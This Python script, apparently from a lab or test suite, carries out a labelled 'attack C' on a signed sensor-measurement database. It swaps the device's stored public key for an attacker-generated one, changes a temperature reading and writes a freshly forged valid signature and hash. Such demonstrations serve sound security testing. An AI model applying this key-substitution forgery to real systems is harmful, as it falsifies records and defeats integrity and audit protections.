import base64, hashlib, sys
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from main import get_db, build_payload

ID = int(sys.argv[1]) if len(sys.argv) > 1 else 1
evil = ec.generate_private_key(ec.SECP256R1())
pem = evil.public_key().public_bytes(
    serialization.Encoding.PEM,
    serialization.PublicFormat.SubjectPublicKeyInfo).decode()

db = get_db(); cur = db.cursor()
cur.execute("""SELECT device_id, TO_CHAR(timestamp_val,'YYYY-MM-DD"T"HH24:MI:SS'),
               sensor_status, counter FROM MEASUREMENT WHERE measurement_id=:1""", (ID,))
dev, ts, st, ctr = cur.fetchone()
payload = build_payload(dev, 30.0, ts, st, ctr)
sig = base64.b64encode(evil.sign(payload, ec.ECDSA(hashes.SHA256()))).decode()

cur.execute("UPDATE DEVICE SET public_key=:1 WHERE device_id=:2", (pem, dev))
cur.execute("UPDATE MEASUREMENT SET temperature=30, device_hash=:1, signature=:2 WHERE measurement_id=:3",
            (hashlib.sha256(payload).hexdigest(), sig, ID))
db.commit(); db.close()
print("attack C applied to measurement", ID)